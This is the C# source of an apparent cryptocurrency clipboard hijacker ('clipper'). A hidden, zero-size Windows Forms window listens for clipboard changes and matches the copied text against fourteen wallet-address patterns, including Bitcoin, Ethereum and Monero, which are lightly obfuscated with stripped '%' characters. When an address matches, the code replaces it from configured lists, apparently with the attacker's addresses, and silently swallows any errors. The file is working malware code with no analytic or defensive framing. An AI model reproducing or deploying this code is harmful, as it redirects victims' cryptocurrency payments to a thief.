using Stub.Help;
using Stub.Helpers;
using System;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            SuspendLayout();

            ClientSize = new Size(0, 0);
            Name = "Form1";
            Text = "Form1";
            Load += new EventHandler(Form1_Load_1);
            ResumeLayout(false);
            AddClipboardFormatListener(Handle);
        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        protected override void WndProc(ref Message m)
        {
            try
            {
                Thread.Sleep(200);
                string btc = @"%\%b%(%b%c%1%|%[%1%3%]%)%[%a%-%z%A%-%H%J%-%N%P%-%Z%0%-%9%]%{%2%6%,%3%5%}%\%b%".Replace("%", ""); // Bitcoin
                string btc_bc1 = @"%^%b%c%1%[%a%-%z%A%-%H%J%-%N%P%-%Z%0%-%9%]%{%3%5%,%4%1%}%\%b%".Replace("%", ""); ; // Bitcoin
                string eth = @"%(%0%x%)%[%a%-%f%A%-%F%0%-%9%]%{%4%0%}%".Replace("%", ""); // Ethereum
                string xmr = @"%[%4%8%]%[%0%-%9%A%B%]%[%1%-%9%A%-%H%J%-%N%P%-%Z%a%-%k%m%-%z%]%{%9%3%}%".Replace("%", ""); // Monero
                string xlm = @"%^%G%[%0%-%9%a%-%z%A%-%Z%]%{%5%5%}%$%".Replace("%", ""); // Stellar
                string xrp = @"^%r%[%0%-%9%a%-%z%A%-%Z%]%{%2%4%,%3%4%}%$%".Replace("%", ""); // Ripple
                string nec = @"%^%A%[%0%-%9%a%-%z%A%-%Z%]%{%3%3%}%$%".Replace("%", ""); // Neocoin
                string bch = @"%^%(%(%b%i%t%c%o%i%n%c%a%s%h%:%)%?%(%q%|%p%)%[%a%-%z%0%-%9%]%{%4%1%}%)%".Replace("%", ""); // Bitcoin Cash
                string ltcl = @"%[%L%M%]%[%a%-%k%m%-%z%A%-%H%J%-%N%P%-%Z%1%-%9%]%{%2%6%,%3%3%}%".Replace("%", ""); // Litecoin L
                string doge = @"%^%D%{%1%}%[%5%-%9%A%-%H%J%-%N%P%-%U%]%{%1%}%[%1%-%9%A%-%H%J%-%N%P%-%Z%a%-%k%m%-%z%]%{%3%2%}%$%".Replace("%", ""); // Dogecoin
                string dash = @"%^%X%[%1%-%9%A%-%H%J%-%N%P%-%Z%a%-%k%m%-%z%]%{%3%3%}%$%".Replace("%", ""); // Dashcoin
                string trx = @"%^%T%[%a%-%z%A%-%Z%0%-%9%]%{%2%8%,%3%3%}%$%".Replace("%", ""); // Tron
                string zcash = @"%t%1%[%0%-%9%A%-%z%]%{%3%3%}%".Replace("%", ""); // ZCash
                string bnb = @"%(%b%n%b%)%(%[%a%-%z%0%-%9%]%{%3%9%}%)%".Replace("%", ""); // Binance Coin

                base.WndProc(ref m);

                if (m.Msg != 0x031D) return;

                if (!Clipboard.ContainsText()) return;
                Cfgnative.CheckD();

                var buf = ClipboardNative.GetText();

                string[] lst;
                if (Config.BTC.ToList().Contains(buf)
                    ^ Config.BTC_BC1.ToList().Contains(buf)
                    ^ Config.ETH.ToList().Contains(buf)
                    ^ Config.XMR.ToList().Contains(buf)
                    ^ Config.xlm.ToList().Contains(buf)
                    ^ Config.xrp.ToList().Contains(buf)
                    ^ Config.nec.ToList().Contains(buf)
                    ^ Config.BCH.ToList().Contains(buf)
                    ^ Config.LTC.ToList().Contains(buf)
                    ^ Config.BCH.ToList().Contains(buf)
                    ^ Config.LTC.ToList().Contains(buf)
                    ^ Config.DOGE.ToList().Contains(buf)
                    ^ Config.dash.ToList().Contains(buf)
                    ^ Config.trx.ToList().Contains(buf)
                    ^ Config.zcash.ToList().Contains(buf)
                    ^ Config.bnb.ToList().Contains(buf)
                     ) return;

                if (RegEx.Checker(buf, btc))
                {
                    lst = Config.BTC;
                }

                else if (RegEx.Checker(buf, btc_bc1))
                {
                    lst = Config.BTC_BC1;
                }

                else if (RegEx.Checker(buf, eth))
                {
                    lst = Config.ETH;
                }

                else if (RegEx.Checker(buf, xmr))
                {
                    lst = Config.XMR;
                }

                else if (RegEx.Checker(buf, xlm))
                {
                    lst = Config.xlm;
                }

                else if (RegEx.Checker(buf, xrp))
                {
                    lst = Config.xrp;
                }

                else if (RegEx.Checker(buf, nec))
                {
                    lst = Config.nec;
                }

                else if (RegEx.Checker(buf, bch))
                {
                    lst = Config.BCH;
                }

                else if (RegEx.Checker(buf, ltcl))
                {
                    lst = Config.LTC;
                }

                else if (RegEx.Checker(buf, doge))
                {
                    lst = Config.DOGE;
                }

                else if (RegEx.Checker(buf, dash))
                {
                    lst = Config.dash;
                }

                else if (RegEx.Checker(buf, trx))
                {
                    lst = Config.trx;
                }

                else if (RegEx.Checker(buf, zcash))
                {
                    lst = Config.zcash;
                }

                else if (RegEx.Checker(buf, bnb))
                {
                    lst = Config.bnb;
                }
                else return;

                SetClipBoard.Run(buf, lst);
                Thread.Sleep(100);

                NativeMethods.EmptyClipboard();
            }
            catch { }

            base.WndProc(ref m);
        }
    }
}


